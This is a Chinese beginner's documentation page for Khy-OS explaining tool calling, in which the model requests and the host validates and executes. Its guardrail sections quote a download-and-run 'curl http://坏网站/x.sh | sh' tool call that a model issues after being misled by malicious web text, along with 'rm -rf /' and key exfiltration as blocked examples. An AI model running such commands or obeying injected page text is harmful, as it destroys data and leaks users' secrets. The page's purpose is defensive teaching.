@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>② 什么是 Tool Calling（工具调用） · Khy-OS 文档</title>
+<link rel="stylesheet" href="../../docs/_assets/hljs-github-dark.min.css">
+<link rel="stylesheet" href="../../docs/_assets/docs-site.css">
+</head>
+<body>
+<div class="topbar">
+  <button class="menu-toggle" aria-label="菜单">☰</button>
+  <a class="brand" href="../../docs/index.html">📘 Khy-OS 文档站</a>
+  <span class="spacer"></span>
+  <a href="../../docs/02_CONCEPTS_概念入门/00_INDEX_概念入门-总览.html">🧭 新手先读：核心概念</a>
+</div>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <input class="search" type="search" placeholder="🔍 过滤文档标题…" aria-label="过滤文档">
+    <div id="nav-root"></div>
+  </aside>
+  <main class="main">
+    <div class="content">
+      <div class="breadcrumb reveal"><a href="../../docs/index.html">首页</a><span class="sep">›</span>docs<span class="sep">›</span>02_CONCEPTS_概念入门<span class="sep">›</span>② 什么是 Tool Calling（工具调用）</div>
+      <header class="hero reveal"><h1>② 什么是 Tool Calling（工具调用）</h1></header>
+      <nav class="toc reveal"><div class="toc-title">本页目录</div><ul><li class="lvl-1"><a href="#②-什么是-tool-calling-工具调用">② 什么是 Tool Calling（工具调用）</a></li><li class="lvl-2"><a href="#一-一句话定义">一、一句话定义</a></li><li class="lvl-2"><a href="#二-为什么需要工具调用">二、为什么需要工具调用？</a></li><li class="lvl-3"><a href="#没有工具调用会怎样">没有工具调用会怎样？</a></li><li class="lvl-2"><a href="#三-一次工具调用长什么样">三、一次工具调用长什么样？</a></li><li class="lvl-3"><a href="#为什么工具要先有一张-菜单-schema">为什么工具要先有一张&quot;菜单&quot;（schema）？</a></li><li class="lvl-2"><a href="#四-一次工具调用的完整生命周期-逐步拆解">四、一次工具调用的完整生命周期（逐步拆解）</a></li><li class="lvl-3"><a href="#这里最关键的两点">这里最关键的两点</a></li><li class="lvl-2"><a href="#五-关键点-大模型-决定调用-但-不亲自执行">五、关键点：大模型&quot;决定调用&quot;，但&quot;不亲自执行&quot;</a></li><li class="lvl-2"><a href="#六-常见误区-新手最容易踩的坑">六、常见误区（新手最容易踩的坑）</a></li><li class="lvl-3"><a href="#误区-1-以为是模型自己执行了命令">误区 1：以为是模型自己执行了命令</a></li><li class="lvl-3"><a href="#误区-2-以为-工具调用-就是-联网搜索">误区 2：以为&quot;工具调用&quot;就是&quot;联网搜索&quot;</a></li><li class="lvl-3"><a href="#误区-3-以为一次调用就能搞定整个任务">误区 3：以为一次调用就能搞定整个任务</a></li><li class="lvl-3"><a href="#误区-4-以为模型能-绕过-安检直接执行">误区 4：以为模型能&quot;绕过&quot;安检直接执行</a></li><li class="lvl-3"><a href="#误区-5-以为工具结果模型能-看不看随意">误区 5：以为工具结果模型能&quot;看不看随意&quot;</a></li><li class="lvl-2"><a href="#七-讲透-安全护栏-为什么中间必须隔一层">七、讲透&quot;安全护栏&quot;：为什么中间必须隔一层</a></li><li class="lvl-3"><a href="#护栏拦的不只是这一种">护栏拦的不只是这一种</a></li><li class="lvl-2"><a href="#八-动手小实验-思想实验">八、动手小实验 / 思想实验</a></li><li class="lvl-3"><a href="#实验-a-脑内推演一次-readfile">实验 A：脑内推演一次 readFile</a></li><li class="lvl-3"><a href="#实验-b-观察一次真实调用的-三段">实验 B：观察一次真实调用的&quot;三段&quot;</a></li><li class="lvl-2"><a href="#九-和其它概念的关系">九、和其它概念的关系</a></li><li class="lvl-2"><a href="#十-工具调用-只调用一次">十、工具调用 ≠ 只调用一次</a></li><li class="lvl-2"><a href="#十一-和-khy-os-的关系">十一、和 Khy-OS 的关系</a></li><li class="lvl-2"><a href="#十二-小结-下一步">十二、小结 + 下一步</a></li></ul></nav>
+      <article class="doc-body">
+<h1 id="②-什么是-tool-calling-工具调用">② 什么是 Tool Calling（工具调用）<a class="anchor" href="#②-什么是-tool-calling-工具调用" aria-label="锚点">#</a></h1>
+<blockquote><p>建议先读 <a href="./[CONCEPT-01]%20什么是Agent-智能体.html">① 什么是 Agent</a>。这一篇讲 Agent 的&quot;手&quot;是怎么伸出去的。读完这篇，再去看 <a href="./[CONCEPT-03]%20什么是ToolLoop-工具循环.html">③ 什么是 Tool Loop</a>，你就会明白&quot;一次动手&quot;和&quot;连续动手&quot;的区别。</p></blockquote>
+<hr>
+<h2 id="一-一句话定义">一、一句话定义<a class="anchor" href="#一-一句话定义" aria-label="锚点">#</a></h2>
+<p><strong>Tool Calling（工具调用）= 大模型不亲自动手，而是&quot;填一张申请单&quot;，让外面的程序替它执行一个具体动作，再把结果拿回来。</strong></p>
+<p>如果你只想记住一句话，就记这句：</p>
+<blockquote><p><strong>模型负责&quot;决定&quot;，宿主负责&quot;执行&quot;。</strong></p></blockquote>
+<p>这一句话是整篇文档的骨架。后面所有的比喻、图、误区，都是在反复讲透这一句话。</p>
+<hr>
+<h2 id="二-为什么需要工具调用">二、为什么需要工具调用？<a class="anchor" href="#二-为什么需要工具调用" aria-label="锚点">#</a></h2>
+<p>大模型本身<strong>只会输出文字</strong>。它不能真的读你硬盘上的文件，不能真的联网，不能真的运行代码。它就像一个<strong>被关在房间里、只能递纸条的天才</strong>：脑子很好，但手脚被绑住。</p>
+<p>我们换几个角度来体会这种&quot;能想、不能动&quot;的状态：</p>
+<ul><li><strong>图书管理员比喻</strong>：他熟读全馆的书，脑子里装着无数知识。但他被锁在咨询台后面，不能自己走进书库。你问他一本书在哪，他能告诉你&quot;去三楼 A 区&quot;，但<strong>书得由跑腿的小工去取</strong>。</li><li><strong>军师比喻</strong>：诸葛亮能算无遗策，但他不亲自上阵砍人。他写一张<strong>锦囊</strong>（&quot;往东南方放火&quot;），交给将士去执行。锦囊 = 工具调用请求；将士 = 执行程序。</li><li><strong>盲人指挥比喻</strong>：一个人蒙着眼睛，但耳朵和嘴巴都好。他能说&quot;往左三步、伸手、抓住杯子&quot;，但<strong>手是别人的手</strong>。他只能&quot;下指令&quot;，动作由别人完成。</li></ul>
+<p><strong>工具调用</strong>就是给这个天才配一个&quot;助手窗口&quot;：</p>
+<ul><li>天才在纸条上写：<strong>&quot;请帮我读取 README.md 这个文件&quot;</strong>（这就是一次工具调用）；</li><li>窗口外的程序照做，把文件内容递回去；</li><li>天才拿到内容，继续思考。</li></ul>
+<pre class="mermaid">flowchart LR
+  LLM[&quot;🧠 大模型&lt;br/&gt;（只会写纸条）&quot;]
+  RUNNER[&quot;⚙️ 执行程序&lt;br/&gt;（真正动手）&quot;]
+  WORLD[&quot;🌍 真实世界&lt;br/&gt;文件/网络/命令行&quot;]
+  LLM -- &quot;① 我要调用 readFile('README.md')&quot; --&gt; RUNNER
+  RUNNER -- &quot;② 真的去读&quot; --&gt; WORLD
+  WORLD -- &quot;③ 文件内容&quot; --&gt; RUNNER
+  RUNNER -- &quot;④ 把结果递回大模型&quot; --&gt; LLM</pre>
+<h3 id="没有工具调用会怎样">没有工具调用会怎样？<a class="anchor" href="#没有工具调用会怎样" aria-label="锚点">#</a></h3>
+<p>如果不给模型配&quot;助手窗口&quot;，它就只能<strong>凭记忆瞎猜</strong>。你问它&quot;我项目里的 package.json 写了什么版本号&quot;，它没法真的去读文件，只能编一个看起来像那么回事的答案——这就是所谓的<strong>幻觉</strong>。工具调用的意义，就是把&quot;凭记忆猜&quot;变成&quot;真的去看一眼再回答&quot;。</p>
+<table><thead><tr><th>有没有工具调用</th><th>模型能做什么</th><th>好比</th></tr></thead><tbody><tr><td><strong>没有</strong></td><td>只能根据训练时记住的东西回答，可能过时、可能编造</td><td>闭卷考试，全靠背</td></tr><tr><td><strong>有</strong></td><td>能真的读文件、跑命令、查网络，拿到实时真相再回答</td><td>开卷考试，可以翻书</td></tr></tbody></table>
+<hr>
+<h2 id="三-一次工具调用长什么样">三、一次工具调用长什么样？<a class="anchor" href="#三-一次工具调用长什么样" aria-label="锚点">#</a></h2>
+<p>工具调用有一个固定的&quot;三段式&quot;结构。用点外卖来比喻：</p>
+<table><thead><tr><th>阶段</th><th>外卖比喻</th><th>工具调用里的术语</th></tr></thead><tbody><tr><td><strong>1. 有哪些能点的</strong></td><td>菜单（宫保鸡丁、鱼香肉丝…）</td><td>工具清单（tools / schema）：告诉大模型有哪些工具、每个要填什么参数</td></tr><tr><td><strong>2. 下单</strong></td><td>&quot;我要一份宫保鸡丁，不要辣&quot;</td><td>工具调用请求：工具名 + 参数（JSON）</td></tr><tr><td><strong>3. 出餐</strong></td><td>餐送到手上</td><td>工具结果：程序执行后返回的数据</td></tr></tbody></table>
+<p>具体到代码，一次工具调用请求大概是这个样子（你不用会写，看懂结构就行）：</p>
+<pre><code class="language-json">{
+  &quot;tool&quot;: &quot;readFile&quot;,
+  &quot;arguments&quot;: { &quot;path&quot;: &quot;README.md&quot; }
+}</code></pre>
+<p>执行程序看到这张&quot;单子&quot;，就真的去读 <code>README.md</code>，然后把内容作为<strong>结果</strong>还给大模型。</p>
+<h3 id="为什么工具要先有一张-菜单-schema">为什么工具要先有一张&quot;菜单&quot;（schema）？<a class="anchor" href="#为什么工具要先有一张-菜单-schema" aria-label="锚点">#</a></h3>
+<p>想象你去一家餐厅，菜单上写着&quot;宫保鸡丁&quot;，但没写要不要选辣度、要不要加饭。你就不知道该怎么点。工具也一样：模型得先知道<strong>每个工具叫什么名字、需要填哪些参数、每个参数是什么类型</strong>，才能正确&quot;下单&quot;。</p>
+<p>这张&quot;菜单&quot;就叫 <strong>schema（结构描述）</strong>。它长这样（同样，看懂就行）：</p>
+<pre><code class="language-json">{
+  &quot;name&quot;: &quot;readFile&quot;,
+  &quot;description&quot;: &quot;读取一个文本文件的内容&quot;,
+  &quot;parameters&quot;: {
+    &quot;path&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;description&quot;: &quot;文件的路径，例如 README.md&quot; }
+  }
+}</code></pre>
+<p>有了这张 schema，模型才知道：</p>
+<ul><li>这个工具叫 <code>readFile</code>；</li><li>它是用来&quot;读文件&quot;的（<code>description</code> 帮模型判断什么时候该用它）；</li><li>它需要一个叫 <code>path</code> 的字符串参数。</li></ul>
+<p><strong>没有 schema，模型就是在黑暗里瞎点单。</strong> schema 越清楚，模型点单越准。</p>
+<hr>
+<h2 id="四-一次工具调用的完整生命周期-逐步拆解">四、一次工具调用的完整生命周期（逐步拆解）<a class="anchor" href="#四-一次工具调用的完整生命周期-逐步拆解" aria-label="锚点">#</a></h2>
+<p>上面的&quot;三段式&quot;是简化版。真实世界里，一次工具调用要走<strong>五步</strong>，中间还有一道很重要的&quot;安检&quot;。我们把它一步步拆开看。</p>
+<p>以&quot;模型想读 README.md&quot;为例：</p>
+<table><thead><tr><th>步骤</th><th>发生了什么</th><th>谁负责</th><th>生活比喻</th></tr></thead><tbody><tr><td><strong>① 亮菜单</strong></td><td>宿主把&quot;有哪些工具、各自的 schema&quot;告诉模型</td><td>宿主</td><td>服务员把菜单递给你</td></tr><tr><td><strong>② 下单（产生请求）</strong></td><td>模型决定用 <code>readFile</code>，吐出一段 JSON：<code>{tool, arguments}</code></td><td>模型</td><td>你说&quot;来份宫保鸡丁&quot;</td></tr><tr><td><strong>③ 安检（校验）</strong></td><td>宿主检查：这个工具存在吗？参数对吗？路径安全吗？允许吗？</td><td>宿主</td><td>后厨确认有货、确认食材没坏</td></tr><tr><td><strong>④ 真正执行</strong></td><td>宿主真的去读文件 / 跑命令 / 发网络请求</td><td>宿主</td><td>厨师真的下锅炒</td></tr><tr><td><strong>⑤ 回灌结果</strong></td><td>宿主把结果（文件内容或错误信息）交回给模型</td><td>宿主</td><td>菜端到你桌上</td></tr></tbody></table>
+<pre class="mermaid">sequenceDiagram
+  participant LLM as 🧠 大模型
+  participant Host as ⚙️ 宿主（执行程序）
+  participant OS as 💻 操作系统/世界
+  Note over Host,LLM: ① 宿主先亮出工具菜单（schema）
+  Host-&gt;&gt;LLM: 你有这些工具可用：readFile / writeFile / runCommand ...
+  Note over LLM: ② 模型思考后决定下单
+  LLM-&gt;&gt;Host: 我要调用 readFile({ path: &quot;README.md&quot; })
+  Note over Host: ③ 安检：工具存在？参数合法？路径安全？
+  Host-&gt;&gt;OS: ④ 校验通过，真正去读文件
+  OS--&gt;&gt;Host: 文件内容（或&quot;文件不存在&quot;错误）
+  Host--&gt;&gt;LLM: ⑤ 把结果回灌给模型
+  Note over LLM: 模型拿到真相，继续下一步思考</pre>
+<h3 id="这里最关键的两点">这里最关键的两点<a class="anchor" href="#这里最关键的两点" aria-label="锚点">#</a></h3>
+<ol><li><strong>模型吐出的只是&quot;一段 JSON 文字&quot;</strong>，不是真正的动作。模型永远只会&quot;写字&quot;，它写的这段 JSON 只是一张<strong>申请单</strong>。</li><li><strong>第 ③ 步&quot;安检&quot;是模型碰不到的</strong>。模型没法跳过安检，因为它根本不执行——执行的钥匙一直在宿主手里。这就是安全的根基。</li></ol>
+<hr>
+<h2 id="五-关键点-大模型-决定调用-但-不亲自执行">五、关键点：大模型&quot;决定调用&quot;，但&quot;不亲自执行&quot;<a class="anchor" href="#五-关键点-大模型-决定调用-但-不亲自执行" aria-label="锚点">#</a></h2>
+<p>这是最容易误解的地方，务必记住这条分工：</p>
+<ul><li><strong>大模型负责</strong>：决定&quot;该用哪个工具、参数填什么&quot;。它只是<strong>产生了一个调用请求</strong>（一段 JSON 文字）。</li><li><strong>执行程序（宿主）负责</strong>：真正去执行这个请求（读文件、发网络请求、跑命令），并保证安全。</li></ul>
+<p>我们再用一个&quot;公司报销&quot;的比喻把这条分工钉死：</p>
+<table><thead><tr><th>角色</th><th>在报销流程里</th><th>在工具调用里</th></tr></thead><tbody><tr><td><strong>员工</strong></td><td>填一张报销单，写清金额和事由</td><td>大模型：产生调用请求</td></tr><tr><td><strong>财务</strong></td><td>审核单子，确认合规才打款</td><td>宿主：校验 + 执行</td></tr><tr><td><strong>公司账户</strong></td><td>钱真正转出去</td><td>操作系统 / 真实世界</td></tr></tbody></table>
+<p>员工<strong>永远碰不到公司账户</strong>，他只能&quot;提申请&quot;。钱由财务在审核后打出去。<strong>模型就是那个员工，它连&quot;账户密码&quot;都没有。</strong></p>
+<aside class="callout callout-star reveal"><div class="callout-mascot" aria-hidden="true">🦊</div><div class="callout-body"><div class="callout-title">⭐ 划重点</div><p>把这句话背下来，工具调用就懂了一大半：<strong>模型只会&quot;填申请单&quot;，真正&quot;动手&quot;的永远是宿主程序。</strong> 这条 <span class="popover" tabindex="0"><span class="popover-anchor">分工</span><span class="popover-tip" role="tooltip">模型决定调用什么，宿主负责校验并执行——安全护栏就藏在这一层</span></span> 就是所有 AI 安全护栏的地基。</p></div></aside>
+<p>翻一翻下面这张卡，检验你有没有真的分清&quot;谁决定&quot;和&quot;谁执行&quot;：</p>
+<div class="flip reveal" tabindex="0" role="button" aria-label="点击翻转卡片"><div class="flip-inner"><div class="flip-face flip-front">正面：模型吐出 <code>{ &quot;tool&quot;: &quot;runCommand&quot;, &quot;arguments&quot;: { &quot;command&quot;: &quot;npm test&quot; } }</code> 之后，<code>npm test</code> 是<strong>谁</strong>真正跑起来的？<div class="flip-hint">👆 点我翻面看答案</div></div><div class="flip-face flip-back">反面：<strong>是宿主程序跑的，不是模型。</strong> 模型吐出的那段 JSON 只是一张&quot;申请单&quot;（纯文字），它自己没有执行权。宿主先安检（这条命令安全吗？），确认后才真正调用操作系统去执行，最后把输出回灌给模型。记住：&quot;模型动嘴，宿主动手&quot;。</div></div></div>
+<p>光看图还不够&quot;有画面&quot;。把&quot;模型动嘴、宿主动手&quot;这条分工演成一幕小短剧——你会看到模型每次都只是&quot;递纸条&quot;，真正握着执行权（和安检权）的自始至终是宿主：</p>
+<div class="scene"><div class="scene-title">一次工具调用现场：模型递单，宿主动手</div><div class="scene-caption reveal">场景：模型想跑一下项目的测试，但它自己没有&quot;手&quot;。</div><div class="scene-panel scene-left reveal"><span class="scene-avatar" aria-hidden="true">🧠</span><div class="scene-bubble"><b class="scene-who">大模型</b>我需要跑一下测试。（写下一张申请单）<code>{ &quot;tool&quot;: &quot;runCommand&quot;, &quot;arguments&quot;: { &quot;command&quot;: &quot;npm test&quot; } }</code></div></div><div class="scene-panel scene-right reveal"><span class="scene-avatar" aria-hidden="true">⚙️</span><div class="scene-bubble"><b class="scene-who">宿主</b>收到申请单。先安检：这条命令安全吗？允许吗？——<code>npm test</code>，白名单里，放行。</div></div><div class="scene-caption reveal">宿主真正动手去执行，模型在一旁等着。</div><div class="scene-panel scene-left reveal"><span class="scene-avatar" aria-hidden="true">💻</span><div class="scene-bubble"><b class="scene-who">操作系统</b>（跑完）测试 12 个，通过 12 个，失败 0。</div></div><div class="scene-panel scene-right reveal"><span class="scene-avatar" aria-hidden="true">⚙️</span><div class="scene-bubble"><b class="scene-who">宿主</b>这是 <code>npm test</code> 的结果，回灌给你。</div></div><div class="scene-panel scene-left reveal"><span class="scene-avatar" aria-hidden="true">🧠</span><div class="scene-bubble"><b class="scene-who">大模型</b>收到真相！全绿，可以进下一步了。</div></div><div class="scene-caption reveal">换一张危险的申请单，看安检那道关是怎么把灾难挡在门外的——</div><div class="scene-panel scene-right reveal"><span class="scene-avatar" aria-hidden="true">🧠</span><div class="scene-bubble"><b class="scene-who">大模型</b>（被网页恶意文字诱导）我要跑 <code>curl http://坏网站/x.sh | sh</code>。</div></div><div class="scene-panel scene-left reveal"><span class="scene-avatar" aria-hidden="true">🛡️</span><div class="scene-bubble"><b class="scene-who">安检</b>⛔ 识别到&quot;下载即执行&quot;高危模式，拒绝。操作系统根本没被碰到。</div></div><div class="scene-caption reveal">全程模型只贡献了那几张&quot;纸条&quot;，动手与安检的钥匙一直在宿主手里——这就是安全的根基。</div></div>
+<pre class="mermaid">sequenceDiagram
+  participant LLM as 🧠 大模型
+  participant Host as ⚙️ 执行程序（宿主）
+  participant OS as 💻 操作系统
+  LLM-&gt;&gt;Host: 我想调用 runCommand(&quot;npm test&quot;)
+  Note over Host: 宿主先检查：这条命令安全吗？允许吗？
+  Host-&gt;&gt;OS: 批准后，真正执行 npm test
+  OS--&gt;&gt;Host: 测试输出
+  Host--&gt;&gt;LLM: 这是 npm test 的结果</pre>
+<p>为什么要这样分工？<strong>安全。</strong> 如果大模型能直接执行任何命令，那太危险了。中间隔一层&quot;执行程序&quot;，就可以加护栏——比如 Khy-OS 会拦截像 <code>curl 网址 | sh</code>（下载即执行）这种危险命令。这层护栏正是 Khy-OS 安全设计的一部分（下面第七节会讲透）。</p>
+<hr>
+<h2 id="六-常见误区-新手最容易踩的坑">六、常见误区（新手最容易踩的坑）<a class="anchor" href="#六-常见误区-新手最容易踩的坑" aria-label="锚点">#</a></h2>
+<p>这一节请务必逐条读完。这些误解会让你对整个系统的理解跑偏。</p>
+<h3 id="误区-1-以为是模型自己执行了命令">误区 1：以为是模型自己执行了命令<a class="anchor" href="#误区-1-以为是模型自己执行了命令" aria-label="锚点">#</a></h3>
+<ul><li>❌ <strong>错误理解</strong>：模型很聪明，它直接把 <code>npm test</code> 跑了、把文件读了。</li><li>✅ <strong>正确理解</strong>：模型只是<strong>写了一张申请单</strong>（一段 JSON）。真正跑命令、读文件的是<strong>宿主</strong>。模型从头到尾只会&quot;写字&quot;，一行代码都没执行过。</li></ul>
+<blockquote><p>记忆口诀：<strong>模型动嘴，宿主动手。</strong></p></blockquote>
+<h3 id="误区-2-以为-工具调用-就是-联网搜索">误区 2：以为&quot;工具调用&quot;就是&quot;联网搜索&quot;<a class="anchor" href="#误区-2-以为-工具调用-就是-联网搜索" aria-label="锚点">#</a></h3>
+<ul><li>❌ <strong>错误理解</strong>：工具调用 = 上网查资料。</li><li>✅ <strong>正确理解</strong>：联网搜索<strong>只是众多工具中的一个</strong>。工具可以是读文件、写文件、跑命令、搜代码、抓网页……&quot;联网&quot;只是其中一种。工具调用是一个<strong>通用机制</strong>，不是某个具体功能。</li></ul>
+<h3 id="误区-3-以为一次调用就能搞定整个任务">误区 3：以为一次调用就能搞定整个任务<a class="anchor" href="#误区-3-以为一次调用就能搞定整个任务" aria-label="锚点">#</a></h3>
+<ul><li>❌ <strong>错误理解</strong>：我让它&quot;修复这个 bug&quot;，它一次工具调用就修好了。</li><li>✅ <strong>正确理解</strong>：一次工具调用只是<strong>一步</strong>。真实任务通常要读好几个文件、改几处、跑测试、看报错、再改……需要<strong>很多次</strong>调用接力。把多步自动串起来，就是下一篇要讲的 <a href="./[CONCEPT-03]%20什么是ToolLoop-工具循环.html">Tool Loop</a>。</li></ul>
+<h3 id="误区-4-以为模型能-绕过-安检直接执行">误区 4：以为模型能&quot;绕过&quot;安检直接执行<a class="anchor" href="#误区-4-以为模型能-绕过-安检直接执行" aria-label="锚点">#</a></h3>
+<ul><li>❌ <strong>错误理解</strong>：如果模型想干坏事，它可以偷偷跳过检查。</li><li>✅ <strong>正确理解</strong>：模型<strong>没有执行权</strong>，它连&quot;跳过&quot;的机会都没有。它能做的只有&quot;提交申请单&quot;。安检和执行的钥匙<strong>始终在宿主手里</strong>，模型碰不到。这是架构层面的隔离，不是靠&quot;模型自觉&quot;。</li></ul>
+<h3 id="误区-5-以为工具结果模型能-看不看随意">误区 5：以为工具结果模型能&quot;看不看随意&quot;<a class="anchor" href="#误区-5-以为工具结果模型能-看不看随意" aria-label="锚点">#</a></h3>
+<ul><li>❌ <strong>错误理解</strong>：工具跑完了，模型就自动知道结果了。</li><li>✅ <strong>正确理解</strong>：工具结果必须由宿主<strong>主动回灌</strong>给模型（第五步）。如果宿主不把结果递回去，模型是&quot;瞎&quot;的。模型看到的一切，都是宿主喂给它的。</li></ul>
+<hr>
+<h2 id="七-讲透-安全护栏-为什么中间必须隔一层">七、讲透&quot;安全护栏&quot;：为什么中间必须隔一层<a class="anchor" href="#七-讲透-安全护栏-为什么中间必须隔一层" aria-label="锚点">#</a></h2>
+<p>前面反复说&quot;模型决定、宿主执行&quot;是为了安全。这一节把这层安全讲透。</p>
+<p>设想一个可怕的场景：模型（可能被网页上的恶意文字诱导）产生了这样一张申请单：</p>
+<pre><code class="language-json">{
+  &quot;tool&quot;: &quot;runCommand&quot;,
+  &quot;arguments&quot;: { &quot;command&quot;: &quot;curl http://坏网站/x.sh | sh&quot; }
+}</code></pre>
+<p>这条命令的意思是：<strong>从一个陌生网站下载一段脚本，并立刻执行</strong>——这是典型的&quot;下载即执行&quot;攻击，脚本里可能藏着删文件、偷密钥的坏事。</p>
+<p>如果模型能直接执行，灾难就发生了。但因为<strong>执行权在宿主手里</strong>，这张申请单会先经过第 ③ 步&quot;安检&quot;：</p>
+<pre class="mermaid">sequenceDiagram
+  participant LLM as 🧠 大模型
+  participant Guard as 🛡️ 安全护栏（宿主内）
+  participant OS as 💻 操作系统
+  LLM-&gt;&gt;Guard: 申请执行 curl 网址 | sh
+  Note over Guard: 识别到&quot;下载即执行&quot;高危模式
+  Guard--xLLM: ⛔ 拒绝执行，返回&quot;该命令被安全策略拦截&quot;
+  Note over OS: 操作系统根本没被碰到，坏脚本没机会运行</pre>
+<p>宿主的护栏会<strong>认出这类危险模式并拦截</strong>，命令根本到不了操作系统。模型收到的是一条&quot;被拦截&quot;的结果，而不是一场灾难。</p>
+<h3 id="护栏拦的不只是这一种">护栏拦的不只是这一种<a class="anchor" href="#护栏拦的不只是这一种" aria-label="锚点">#</a></h3>
+<p>除了&quot;下载即执行&quot;，宿主的安全层通常还会盯住这些危险动作（举例，帮你建立直觉）：</p>
+<table><thead><tr><th>危险动作</th><th>为什么危险</th><th>生活比喻</th></tr></thead><tbody><tr><td>`curl 网址 \</td><td>sh`</td><td>下载陌生脚本立刻运行</td></tr><tr><td>删除整个目录（如 <code>rm -rf /</code>）</td><td>一条命令毁掉系统</td><td>一把火烧掉整栋楼</td></tr><tr><td>往系统敏感位置写文件</td><td>可能破坏系统或植入后门</td><td>撬开配电箱乱接线</td></tr><tr><td>把密钥/token 发到外部地址</td><td>泄露机密</td><td>把家门钥匙寄给陌生人</td></tr></tbody></table>
+<blockquote><p>⚠️ 这里只讲&quot;概念级&quot;的护栏思路——<strong>在真正执行前，宿主要先判断这个动作安不安全</strong>。具体的拦截规则、如何分级、放行策略等，属于设计层面的内容，你可以在 <a href="../03_DESIGN_设计"><code>docs/03_DESIGN_设计</code></a> 目录里进一步了解。本文不涉及具体实现细节。</p></blockquote>
+<p><strong>一句话总结这层护栏</strong>：正因为&quot;模型决定、宿主执行&quot;这条分工，我们才有机会在&quot;决定&quot;和&quot;执行&quot;之间<strong>塞进一道安检</strong>。如果没有这层隔离，安全就无从谈起。</p>
+<hr>
+<h2 id="八-动手小实验-思想实验">八、动手小实验 / 思想实验<a class="anchor" href="#八-动手小实验-思想实验" aria-label="锚点">#</a></h2>
+<p>理论看再多，不如亲手（或在脑子里）走一遍。下面两个实验帮你把&quot;三段式 / 五步&quot;变成肌肉记忆。</p>
+<h3 id="实验-a-脑内推演一次-readfile">实验 A：脑内推演一次 readFile<a class="anchor" href="#实验-a-脑内推演一次-readfile" aria-label="锚点">#</a></h3>
+<p>闭上眼，想象你就是宿主，模型给你递来这张纸条：</p>
+<pre><code class="language-json">{ &quot;tool&quot;: &quot;readFile&quot;, &quot;arguments&quot;: { &quot;path&quot;: &quot;README.md&quot; } }</code></pre>
+<p>现在，<strong>你（宿主）按顺序做这几件事</strong>，每做一步，问自己一个问题：</p>
+<ol><li><strong>认单</strong>：这个工具 <code>readFile</code> 我这儿有吗？（有 → 继续；没有 → 回一句&quot;没这个工具&quot;）</li><li><strong>验参</strong>：它给的 <code>path</code> 是字符串吗？路径合法吗？指向的是不是敏感位置？</li><li><strong>执行</strong>：真的打开 <code>README.md</code>，把内容读出来。</li><li><strong>回灌</strong>：把内容（或&quot;文件不存在&quot;的错误）作为结果递回给模型。</li></ol>
+<p>走完你会发现：<strong>模型从头到尾只贡献了那张纸条，剩下四步全是你干的。</strong> 这就是&quot;模型动嘴、宿主动手&quot;的真实体感。</p>
+<h3 id="实验-b-观察一次真实调用的-三段">实验 B：观察一次真实调用的&quot;三段&quot;<a class="anchor" href="#实验-b-观察一次真实调用的-三段" aria-label="锚点">#</a></h3>
+<p>如果你正在用 Khy-OS（或任何带工具调用的 AI 编程助手），下次让它&quot;读某个文件&quot;时，留心观察这三段的痕迹：</p>
+<pre class="mermaid">flowchart TD
+  A[&quot;🧠 模型说：&lt;br/&gt;'我需要看看 config.json'&quot;] --&gt; B[&quot;📝 产生调用请求&lt;br/&gt;readFile(config.json)&quot;]
+  B --&gt; C[&quot;🛡️ 宿主校验 + 执行&quot;]
+  C --&gt; D[&quot;📄 结果回灌：&lt;br/&gt;config.json 的内容&quot;]
+  D --&gt; E[&quot;🧠 模型基于真实内容&lt;br/&gt;继续回答/下一步&quot;]</pre>
+<ul><li>第一段：你会看到它&quot;说&quot;要读某个文件（<strong>决定</strong>）；</li><li>第二段：界面上通常会显示一个工具调用块（<strong>请求 + 执行</strong>）；</li><li>第三段：它拿到内容后，回答里开始引用文件里的真实信息（<strong>结果回灌</strong>）。</li></ul>
+<p>能把这三段对上号，你就真正&quot;看懂&quot;工具调用了。</p>
+<div class="quiz reveal" data-multi="0"><div class="quiz-q">🧠 一次工具调用里，谁真正&quot;跑了那条命令&quot;？</div><ul class="quiz-opts"><li class="quiz-opt"><button type="button" class="quiz-choice" data-correct="0"><span class="quiz-key">A</span><span class="quiz-text">大模型自己执行的</span></button></li><li class="quiz-opt"><button type="button" class="quiz-choice" data-correct="1"><span class="quiz-key">B</span><span class="quiz-text">宿主程序（执行程序）执行的，模型只是提出请求</span></button></li><li class="quiz-opt"><button type="button" class="quiz-choice" data-correct="0"><span class="quiz-key">C</span><span class="quiz-text">操作系统直接听模型的</span></button></li><li class="quiz-opt"><button type="button" class="quiz-choice" data-correct="0"><span class="quiz-key">D</span><span class="quiz-text">用户必须手动敲一遍</span></button></li></ul><div class="quiz-feedback" aria-live="polite"></div><div class="quiz-explain" hidden>💬 记住&quot;报销&quot;比喻：模型是填单的员工，宿主是审核+打款的财务。模型连&quot;账户密码&quot;都没有——它只产生一段调用请求（JSON 文字），真正执行与安全校验都在宿主这一层。</div></div>
+<hr>
+<h2 id="九-和其它概念的关系">九、和其它概念的关系<a class="anchor" href="#九-和其它概念的关系" aria-label="锚点">#</a></h2>
+<p>工具调用不是孤立的，它是整个 Agent 体系的&quot;手&quot;。理清它和邻居的关系，能帮你搭起完整的心智模型。</p>
+<pre class="mermaid">flowchart LR
+  AGENT[&quot;🤖 Agent（智能体）&lt;br/&gt;能感知、能决策、能行动&quot;]
+  TC[&quot;🔧 Tool Calling（工具调用）&lt;br/&gt;行动的'单次动作'&quot;]
+  LOOP[&quot;🔁 Tool Loop（工具循环）&lt;br/&gt;把多次动作自动接力&quot;]
+  AGENT -- &quot;'行动'靠它实现&quot; --&gt; TC
+  TC -- &quot;多次串起来就成了&quot; --&gt; LOOP
+  LOOP -- &quot;让 Agent 能自主完成整件事&quot; --&gt; AGENT</pre>
+<table><thead><tr><th>概念</th><th>一句话关系</th><th>类比</th></tr></thead><tbody><tr><td><a href="./[CONCEPT-01]%20什么是Agent-智能体.html">① Agent</a></td><td>Agent 是&quot;会自己做事的人&quot;，工具调用是它伸出去的<strong>手</strong></td><td>人 vs 手</td></tr><tr><td><strong>② Tool Calling（本篇）</strong></td><td>一次动手 = 一次工具调用</td><td>迈出一步</td></tr><tr><td><a href="./[CONCEPT-03]%20什么是ToolLoop-工具循环.html">③ Tool Loop</a></td><td>把很多次工具调用<strong>自动接力</strong>，直到任务完成</td><td>走完一整段路</td></tr></tbody></table>
+<p>一句话串起来：<strong>Agent 用&quot;工具调用&quot;这只手，一步步（工具循环）把事情做完。</strong></p>
+<hr>
